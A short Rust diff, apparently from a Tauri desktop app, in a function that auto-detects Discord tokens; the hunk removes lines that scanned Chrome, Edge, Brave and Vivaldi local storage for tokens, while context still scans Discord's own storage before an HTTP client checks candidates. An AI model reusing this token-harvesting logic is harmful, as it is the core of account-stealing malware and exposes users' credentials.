@@ -554,14 +554,6 @@ async fn auto_detect_discord_token() -> Result<String, String> {
         scan_dir_for_tokens(&ptb_dir.join("Local Storage").join("leveldb"), ptb_key.as_deref(), &mut candidates);
     }
 
-    if let Ok(localappdata) = env::var("LOCALAPPDATA") {
-        let root = Path::new(&localappdata);
-        scan_dir_for_tokens(&root.join("Google").join("Chrome").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
-        scan_dir_for_tokens(&root.join("Microsoft").join("Edge").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
-        scan_dir_for_tokens(&root.join("BraveSoftware").join("Brave-Browser").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
-        scan_dir_for_tokens(&root.join("Vivaldi").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
-    }
-
     let client = tauri_plugin_http::reqwest::Client::new();
 
     for token in candidates {
